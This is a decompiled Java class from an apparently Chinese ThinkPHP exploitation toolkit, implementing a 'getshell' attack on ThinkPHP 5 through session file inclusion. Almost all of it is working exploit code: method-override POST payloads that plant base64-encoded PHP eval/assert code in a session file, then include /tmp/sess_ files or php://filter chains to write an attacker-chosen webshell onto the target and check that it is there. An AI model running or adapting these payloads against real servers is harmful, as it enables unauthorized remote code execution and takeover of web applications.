/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.ArrayList;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_session_fi_getshell
/*    */ {
/* 14 */   private final HashMap<String, String> property = new HashMap<>();
/*    */   
/*    */   public String getshell(String url, String router, String fileName, String content) {
/* 17 */     String results = null;
/*    */     try {
/* 19 */       String exp1 = "file_put_contents('" + fileName + "',base64_decode('" + content + "'));";
/* 20 */       String exp2 = Base64.getEncoder().encodeToString(exp1.getBytes(StandardCharsets.UTF_8));
/* 21 */       String exp3 = "<?php $a='file_put_contents';$b='base64_decode';$a($b('" + Base64.getEncoder().encodeToString(fileName.getBytes(StandardCharsets.UTF_8)) + "'),$b('" + content + "'));?>";
/* 22 */       String payload1 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php eval(base64_decode('" + URLEncoder.encode(exp2, "UTF-8") + "'));?>&server[]=1";
/* 23 */       String payload2 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php $a='assert';$b='base64_decode';$a($b('" + URLEncoder.encode(exp2, "UTF-8") + "'));?>&server[]=1";
/* 24 */       String payload3 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=" + URLEncoder.encode(exp3, "UTF-8") + "&server[]=1";
/* 25 */       ArrayList<String> payloads = new ArrayList<>();
/* 26 */       payloads.add(payload3);
/* 27 */       payloads.add(payload1);
/* 28 */       payloads.add(payload2);
/* 29 */       for (String payload : payloads) {
/* 30 */         String str1 = Util.getRandomString(25).toLowerCase();
/* 31 */         this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 32 */         this.property.put("Cookie", "PHPSESSID=" + str1);
/* 33 */         Response response1 = HttpTool.post(url + router, payload, this.property);
/* 34 */         if (response1.getError() == null) {
/* 35 */           payload = "_method=__construct&method=GET&filter[]=think\\__include_file&get[]=/tmp/sess_" + str1 + "&server[]=1";
/* 36 */           HttpTool.post(url + router, payload, this.property);
/* 37 */           this.property.clear();
/* 38 */           Response response2 = HttpTool.get(url + "/" + fileName, this.property);
/* 39 */           if (response2.getCode() == 200) {
/* 40 */             results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 41 */             return results;
/*    */           } 
/*    */         } 
/*    */       } 
/*    */ 
/*    */ 
/*    */       
/* 48 */       exp1 = Base64.getEncoder().encodeToString(("<?php " + exp1 + ";?>").getBytes(StandardCharsets.UTF_8));
/* 49 */       exp1 = exp1.replace("=", "+");
/* 50 */       if (exp1.length() < 100)
/*    */       {
/* 52 */         exp1 = "ab" + exp1;
/*    */       }
/* 54 */       if (exp1.length() > 99 && exp1.length() < 1000)
/*    */       {
/* 56 */         exp1 = "a" + exp1;
/*    */       }
/*    */       
/* 59 */       exp1 = URLEncoder.encode(exp1, "UTF-8");
/* 60 */       String payload4 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=" + exp1 + "&server[]=1";
/* 61 */       String randomStr = Util.getRandomString(25).toLowerCase();
/* 62 */       this.property.put("Cookie", "PHPSESSID=" + randomStr);
/* 63 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 64 */       Response response = HttpTool.post(url + router, payload4, this.property);
/* 65 */       if (response.getError() == null) {
/* 66 */         payload4 = "_method=__construct&filter[]=strrev&filter[]=think\\__include_file&method=get&server[]=1&get[]=" + (new StringBuilder(randomStr)).reverse() + "_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php";
/* 67 */         HttpTool.post(url + router, payload4, this.property);
/* 68 */         this.property.clear();
/* 69 */         Response response1 = HttpTool.get(url + "/" + fileName, this.property);
/* 70 */         if (response1.getCode() == 200) {
/* 71 */           results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 72 */           return results;
/* 73 */         }  if (response.getText().contains("think|a:")) {
/* 74 */           results = "[-] 存在session包含漏洞，但上传失败！";
/*    */         } else {
/* 76 */           results = "[-] 上传失败！";
/*    */         } 
/*    */       } else {
/* 79 */         results = "[-] 上传失败: " + response.getError();
/*    */       } 
/* 81 */     } catch (Exception e) {
/* 82 */       results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 84 */     return results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_session_fi_getshell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */